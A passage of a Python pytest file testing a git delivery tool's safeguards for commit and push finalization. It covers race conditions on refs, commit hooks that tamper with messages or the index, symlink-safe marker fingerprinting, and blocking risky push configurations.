    args = argparse.Namespace(
        operation="push",
        mode="execute",
        repo=str(repo),
        plugin_root=str(plugin),
        state_dir=None,
        run_id="run-push-mismatch",
        pr=None,
        commit_message="title",
        pr_title="title",
        pr_body="body",
        push_remote="origin",
        push_branch=None,
        head=None,
        base="main",
        merge_method="squash",
        delete_branch=True,
        busdriver_state_dir_name=None,
        verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["reason"] == "remote_head_post_push_mismatch"
    assert any(effect["name"] == "git_push_remote_post_verify" and effect["ok"] is False for effect in result["mutating_run"]["side_effects"])


def test_push_blocks_local_head_change_after_review_before_side_effect(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-push-head-drift")
    plugin = fake_busdriver(tmp_path / "busdriver-push-head-drift")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    head_calls = {"count": 0}
    push_called = {"value": False}

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            head_calls["count"] += 1
            return 0, "reviewed-head" if head_calls["count"] == 1 else "changed-head", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    def fake_run_safe(*_args, **_kwargs):
        push_called["value"] = True
        return {"ok": True, "returncode": 0}

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda *_args: (None, "remote_branch_not_found"))
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-push-head-drift",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["reason"] == "local_head_changed_after_review"
    assert push_called["value"] is False


def test_commit_staged_index_uses_git_commit_hooks(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    marker = tmp_path / "hook-ran"
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text(f"#!/bin/sh\nprintf ran > {shlex.quote(str(marker))}\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("two\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "hooked commit", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert marker.read_text() == "ran"
    assert effect["cmd"][:4] == ["git", "-c", "commit.gpgsign=false", "commit"]
    assert "--cleanup=verbatim" in effect["cmd"]
    assert "--no-verify" not in effect["cmd"]
    assert all("commit-tree" not in substep["cmd"] and "update-ref" not in substep["cmd"] for substep in effect["substeps"])


def test_commit_staged_index_can_disable_untrusted_hooks_for_finalization(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-disabled-hooks")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    marker = tmp_path / "hook-must-not-run"
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text(f"#!/bin/sh\nprintf ran > {shlex.quote(str(marker))}\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("two\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "safe commit", disable_hooks=True)

    assert effect["ok"] is True
    assert marker.exists() is False
    assert effect["cmd"][:2] == ["git", "update-ref"]
    assert any(substep["name"] == "git_commit_tree" for substep in effect["substeps"])
    assert any(substep["name"] == "git_update_ref_commit_cas" for substep in effect["substeps"])


def test_commit_staged_index_cas_never_removes_concurrent_commit(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-commit-cas-race")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    original = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    branch_ref = run(["git", "symbolic-ref", "HEAD"], repo).stdout.strip()
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    commit_staged_index = ns["commit_staged_index"]
    globals_ = commit_staged_index.__globals__
    real_run_safe = globals_["run_safe"]
    concurrent: dict[str, str | None] = {"oid": None}

    def racing_run_safe(argv, *args, **kwargs):
        if argv[:2] == ["git", "update-ref"] and concurrent["oid"] is None:
            parent_tree = run(["git", "rev-parse", f"{original}^{{tree}}"], repo).stdout.strip()
            oid = run(["git", "commit-tree", parent_tree, "-p", original, "-m", "concurrent"], repo).stdout.strip()
            assert run(["git", "update-ref", branch_ref, oid, original], repo).returncode == 0
            concurrent["oid"] = oid
        return real_run_safe(argv, *args, **kwargs)

    monkeypatch.setitem(globals_, "run_safe", racing_run_safe)
    effect = commit_staged_index(repo, "reviewed commit", disable_hooks=True)

    assert effect["ok"] is False
    assert effect["error"] == "commit_parent_changed_during_publish"
    assert concurrent["oid"]
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == concurrent["oid"]


def test_commit_staged_index_preserves_ref_advanced_after_successful_cas(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-commit-post-cas-race")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    branch_ref = run(["git", "symbolic-ref", "HEAD"], repo).stdout.strip()
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    commit_staged_index = ns["commit_staged_index"]
    globals_ = commit_staged_index.__globals__
    real_run_safe = globals_["run_safe"]
    concurrent: dict[str, str | None] = {"oid": None}

    def racing_run_safe(argv, *args, **kwargs):
        effect = real_run_safe(argv, *args, **kwargs)
        if argv[:3] == ["git", "update-ref", branch_ref] and concurrent["oid"] is None and effect["ok"]:
            candidate = argv[3]
            tree = run(["git", "rev-parse", f"{candidate}^{{tree}}"], repo).stdout.strip()
            oid = run(["git", "commit-tree", tree, "-p", candidate, "-m", "concurrent"], repo).stdout.strip()
            assert run(["git", "update-ref", branch_ref, oid, candidate], repo).returncode == 0
            concurrent["oid"] = oid
        return effect

    monkeypatch.setitem(globals_, "run_safe", racing_run_safe)
    effect = commit_staged_index(repo, "reviewed commit", disable_hooks=True)

    assert effect["ok"] is False
    assert effect["error"] == "post_publish_ref_advanced"
    assert concurrent["oid"]
    assert effect["candidate_commit"] != concurrent["oid"]
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == concurrent["oid"]
    rollback = next(step for step in effect["substeps"] if step["name"] == "git_update_ref_before_after_hook_drift")
    assert rollback["cmd"] == ["git", "update-ref", branch_ref, effect["before_head"], effect["candidate_commit"]]
    assert rollback["ok"] is False


def test_commit_staged_index_rejects_commit_msg_hook_message_rewrite(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-commit-msg")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    hook = repo / ".git" / "hooks" / "commit-msg"
    hook.write_text("#!/bin/sh\nprintf 'altered message\n' > \"$1\"\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "expected message", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["error"] == "committed_message_mismatch_after_hooks"
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
    assert (repo / "tracked.txt").read_text() == "reviewed\n"
    assert any(substep["name"] == "git_log_message_after_commit" for substep in effect["substeps"])


def test_commit_staged_index_rejects_hook_modified_index(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-mutated\n' > tracked.txt\ngit add tracked.txt\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "hook mutation", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["error"] == "committed_tree_or_parent_mismatch_after_hooks"
    assert effect["reset_to_before_ok"] is True
    assert effect["restore_reviewed_index_ok"] is False
    assert effect["restore_reviewed_worktree_ok"] is False
    assert effect["reconciliation_required"] is True
    assert effect["worktree_index_preserved"] is True
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
    assert (repo / "tracked.txt").read_text() == "hook-mutated\n"
    assert any(substep["name"] == "git_update_ref_before_after_hook_drift" for substep in effect["substeps"])
    assert not any(substep["name"].startswith("git_restore") for substep in effect["substeps"])


@pytest.mark.parametrize(
    ("entry", "expected"),
    [
        (" M dir/file with space.txt", ["dir/file with space.txt"]),
        ("R  old name.txt -> new name.txt", ["old name.txt", "new name.txt"]),
        (' M "dir/file\\nname.txt"', ["dir/file\nname.txt"]),
        ('C  "old\\tname.txt" -> "new\\tname.txt"', ["old\tname.txt", "new\tname.txt"]),
        (' M "\\303\\251.txt"', ["é.txt"]),
        ('R  "old -> name.txt" -> "new.txt"', ["old -> name.txt", "new.txt"]),
        ('R  "old.txt" -> "new -> name.txt"', ["old.txt", "new -> name.txt"]),
        ('R  old_file.txt -> "new -> name.txt"', ["old_file.txt", "new -> name.txt"]),
        ('R  old -> name.txt -> new.txt', ["old -> name.txt", "new.txt"]),
        ('R  old -> name.txt -> "new -> name.txt"', ["old -> name.txt", "new -> name.txt"]),
        ("?? path/with\\backslash.txt", ["path/with\\backslash.txt"]),
    ],
)
def test_porcelain_entry_paths_handles_spaces_renames_and_c_quoting(entry: str, expected: list[str]):
    ns = runpy.run_path(str(DELIVER))

    assert ns["porcelain_entry_paths"](entry) == expected


def test_porcelain_entry_paths_property_style_quoted_rename_round_trip():
    ns = runpy.run_path(str(DELIVER))

    def quote(path: str) -> str:
        return '"' + path.replace("\\", "\\\\").replace('"', '\\"').replace("\t", "\\t").replace("\n", "\\n") + '"'

    old_paths = ["old -> name.txt", "old spaced.txt", "old\tname.txt"]
    new_paths = ["new -> name.txt", "new spaced.txt", "new\nname.txt"]
    for old_path in old_paths:
        for new_path in new_paths:
            entry = f"R  {quote(old_path)} -> {quote(new_path)}"
            assert ns["porcelain_entry_paths"](entry) == [old_path, new_path]


def test_marker_file_fingerprint_does_not_follow_symlink_swapped_after_lstat(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = tmp_path / "repo-marker-swap"
    marker_dir = repo / ".claude"
    marker_dir.mkdir(parents=True)
    marker = marker_dir / "litmus-passed.local"
    marker.write_text("safe marker\n")
    outside = tmp_path / "outside-marker-target"
    outside.write_text("outside secret\n")
    real_open = os.open
    swapped = {"done": False}

    def swapping_open(path, flags, mode=0o777, *, dir_fd=None):
        if Path(path) == marker and not swapped["done"]:
            swapped["done"] = True
            marker.unlink()
            marker.symlink_to(outside)
        if dir_fd is None:
            return real_open(path, flags, mode)
        return real_open(path, flags, mode, dir_fd=dir_fd)

    monkeypatch.setattr(ns["os"], "open", swapping_open)

    fingerprint = ns["marker_file_fingerprint"](repo, ".claude/litmus-passed.local")

    assert swapped["done"] is True
    assert fingerprint == "<read-error>"
    assert marker.is_symlink()


def test_marker_file_fingerprint_does_not_follow_symlink(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = tmp_path / "repo-marker-symlink"
    repo.mkdir()
    outside = tmp_path / "outside-large-secret"
    outside.write_text("outside-secret-content")
    marker_dir = repo / ".claude"
    marker_dir.mkdir()
    marker = marker_dir / "litmus-passed.local"
    marker.symlink_to(outside)

    fingerprint = ns["marker_file_fingerprint"](repo, ".claude/litmus-passed.local")

    assert fingerprint.startswith("<symlink>:")
    assert fingerprint != hashlib.sha256(outside.read_bytes()).hexdigest()


def test_marker_snapshot_rejects_marker_that_disappears_before_fingerprint(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = tmp_path / "repo-marker-missing-during-snapshot"
    marker_dir = repo / ".claude"
    marker_dir.mkdir(parents=True)
    marker = marker_dir / "litmus-passed.local"
    marker.write_text("marker\n")

    monkeypatch.setitem(ns["marker_evidence_snapshot_from_status"].__globals__, "marker_file_fingerprint", lambda _repo, _path: "<missing>")

    snapshot = ns["marker_evidence_snapshot_from_status"](repo, "?? .claude/litmus-passed.local\n", {".claude/litmus-passed.local"})

    assert snapshot == {}
    assert ns["marker_fingerprint_valid"]("<missing>") is False


def test_marker_evidence_snapshot_excludes_too_large_marker(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = tmp_path / "repo-large-marker"
    repo.mkdir()
    marker_dir = repo / ".claude"
    marker_dir.mkdir()
    marker = marker_dir / "litmus-passed.local"
    marker.write_bytes(b"x" * (ns["MARKER_FINGERPRINT_MAX_BYTES"] + 1))

    snapshot = ns["marker_evidence_snapshot_from_status"](repo, "?? .claude/litmus-passed.local\n", {".claude/litmus-passed.local"})

    assert snapshot == {}
    assert ns["marker_file_fingerprint"](repo, ".claude/litmus-passed.local").startswith("<too-large:")


def test_push_remote_safety_rejects_local_push_modifiers(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))

    cases = [
        ("remote.origin.mirror", "true", "remote_mirror_blocked_for_push"),
        ("remote.origin.push", "refs/heads/*:refs/heads/*", "remote_push_refspec_blocked_for_push"),
        ("push.followTags", "true", "push_follow_tags_blocked_for_push"),
        ("push.pushOption", "ci.skip", "push_option_blocked_for_push"),
    ]
    for index, (key, value, reason) in enumerate(cases):
        repo = init_repo(tmp_path / f"repo-{index}")
        assert run(["git", "remote", "add", "origin", "https://github.com/octo/repo.git"], repo).returncode == 0
        assert run(["git", "config", "--local", key, value], repo).returncode == 0

        assert ns["push_remote_safety"](repo, "origin") == (False, reason)




def test_execute_commit_requires_message_and_writes_blocked_artifact(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    env = os.environ.copy()
    env[ARTIFACT_ENV] = str(artifact_dir)

    cp = run(
        [
            sys.executable,
            str(DELIVER),
            "--repo",
            str(repo),
            "--plugin-root",
            str(plugin),
            "--mode",
            "execute",
            "--operation",
            "commit",
        ],
        env=env,
    )
    data = json.loads(cp.stdout)

    assert cp.returncode == 2
    assert cp.stderr == ""
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "commit_message_required"
    assert_finalization_blocked(data["decision"])
    assert Path(data["run_artifact_path"]).exists()


def test_isolated_push_is_non_dispatchable_without_atomic_reviewed_base_binding(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-atomic-base-race")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("base\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "base"], repo).returncode == 0
    assert run(["git", "branch", "-M", "main"], repo).returncode == 0
    base_oid = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    remote = tmp_path / "remote.git"
    assert run(["git", "clone", "--bare", "--no-local", str(repo), str(remote)]).returncode == 0
    assert run(["git", "checkout", "-b", "feature"], repo).returncode == 0
    (repo / "tracked.txt").write_text("feature\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "feature"], repo).returncode == 0
    feature_oid = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    base_tree = run(["git", "--git-dir", str(remote), "rev-parse", f"{base_oid}^{{tree}}"]).stdout.strip()
    advance = run(["git", "--git-dir", str(remote), "-c", "user.name=Concurrent", "-c", "user.email=concurrent@example.com", "commit-tree", base_tree, "-p", base_oid, "-m", "advance base"])
    assert advance.returncode == 0, advance.stderr
    advance_oid = advance.stdout.strip()
    hook = remote / "hooks" / "pre-receive"
    received = tmp_path / "receive-commands"
    hook.write_text(
        "#!/bin/sh\n"
        f"while IFS=' ' read old new ref; do printf '%s %s %s\\n' \"$old\" \"$new\" \"$ref\" >> {shlex.quote(str(received))}; done\n"
        "unset GIT_QUARANTINE_PATH GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES\n"
        f"git update-ref refs/heads/main {advance_oid} {base_oid}\n"
    )
    hook.chmod(0o755)
    assert run(["git", "--git-dir", str(remote), "config", "core.hooksPath", str(remote / "hooks")]).returncode == 0

    effect = ns["run_isolated_push"](repo, str(remote), "feature", None, feature_oid, "main", base_oid)

    assert effect["ok"] is False
    assert effect["error"] == "atomic_push_base_binding_unavailable"
    assert run(["git", "--git-dir", str(remote), "rev-parse", "refs/heads/main"]).stdout.strip() == base_oid
    assert run(["git", "--git-dir", str(remote), "show-ref", "--verify", "refs/heads/feature"]).returncode != 0

    # Characterize the transport gap that keeps production dispatch disabled:
    # Git reports the unchanged base refspec as up to date and sends only the
    # feature update, so the hook can advance base without aborting the feature.
    actual = run(
        [
            "git",
            "push",
            "--porcelain",
            "--atomic",
            f"--force-with-lease=refs/heads/main:{base_oid}",
            f"--force-with-lease=refs/heads/feature:{'0' * 40}",
            str(remote),
            f"{feature_oid}:refs/heads/feature",
            f"{base_oid}:refs/heads/main",
        ],
        repo,
    )
    assert actual.returncode == 0, actual.stderr
    commands = received.read_text().splitlines()
    assert len(commands) == 1
    assert commands[0].endswith(f" {feature_oid} refs/heads/feature")
    assert run(["git", "--git-dir", str(remote), "rev-parse", "refs/heads/main"]).stdout.strip() == advance_oid
    assert run(["git", "--git-dir", str(remote), "rev-parse", "refs/heads/feature"]).stdout.strip() == feature_oid


def test_failed_push_existing_remote_unchanged_remains_git_push_failed(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-failed-push-remote-unchanged")
    plugin = fake_busdriver(tmp_path / "busdriver-failed-push-remote-unchanged")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, False)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("old-remote-head", None))
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": False, "returncode": 1})
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-failed-push-remote-unchanged",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["reason"] == "git_push_failed"


@pytest.mark.parametrize("release_succeeds", [True, False])
def test_push_exact_remote_target_is_noop_with_no_authority_and_release_is_enforced(monkeypatch, tmp_path: Path, release_succeeds: bool):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / f"repo-push-noop-{release_succeeds}")
    plugin = fake_busdriver(tmp_path / f"busdriver-push-noop-{release_succeeds}")
    globals_ = ns["execute_mutating_operation"].__globals__
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        return 0, "", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": release_succeeds, "reason": None if release_succeeds else "release_failed"})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("reviewed-local-head", None))
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id=f"run-push-noop-{release_succeeds}",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)
    release = getattr(ns["execute_mutating_operation"], "last_release")
    reconciliation = ns["release_failure_reconciliation"]("push", result["mutating_run"], release)
    if reconciliation:
        result["decision"], result["steps"], rc = reconciliation
        result["ok"] = False

    assert result["mutating_run"]["lock_release"]["released"] is release_succeeds
    assert_run_authority_blocked(result["mutating_run"])
    if release_succeeds:
        assert rc == 0
        assert result["ok"] is True
        assert result["decision"]["status"] == result["mutating_run"]["status"] == "already_up_to_date"
        assert result["decision"]["reason"] == "remote_branch_already_at_reviewed_head"
    else:
        assert rc != 0
        assert result["ok"] is False
        assert result["decision"]["status"] == result["mutating_run"]["status"] == "already_up_to_date_release_failed"
        assert result["decision"]["reason"] == result["mutating_run"]["reason"] == "finalization_lock_release_failed"


def test_failed_push_with_later_satisfied_target_is_unattributed_and_requires_reconciliation(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-failed-push-remote-updated")
    plugin = fake_busdriver(tmp_path / "busdriver-failed-push-remote-updated")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, False)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    live_head_calls = {"count": 0}

    def fake_live_remote_branch_head(_repo, _branch, _remote):
        live_head_calls["count"] += 1
        if live_head_calls["count"] == 1:
            return "old-remote-head", None
        return "reviewed-local-head", None

    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": False, "returncode": 1})
    args = argparse.Namespace(
        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-failed-push-remote-updated",
        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
    )

    result, rc = ns["execute_mutating_operation"](args, delivery_status)

    assert rc == 1
    assert result["ok"] is False
    assert result["decision"]["status"] == result["mutating_run"]["status"] == "observed_target_unattributed"
    assert result["decision"]["reason"] == "push_failed_target_observed_reconciliation_required"
    assert [step["status"] for step in result["steps"]] == ["passed", "failed", "failed"]
    assert_run_authority_blocked(result["mutating_run"])
    push_effect = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_push")
    assert push_effect["ok"] is False
    recheck = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_push_remote_recheck")
    assert recheck["remote_head"] == "reviewed-local-head"
    assert recheck["attributed_to_current_push"] is False
    assert recheck["reconciliation_required"] is True


def test_failed_push_target_observed_with_local_drift_remains_unattributed(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-failed-push-remote-updated-local-dirty")
    plugin = fake_busdriver(tmp_path / "busdriver-failed-push-remote-updated-local-dirty")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, False)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    live_head_calls = {"count": 0}

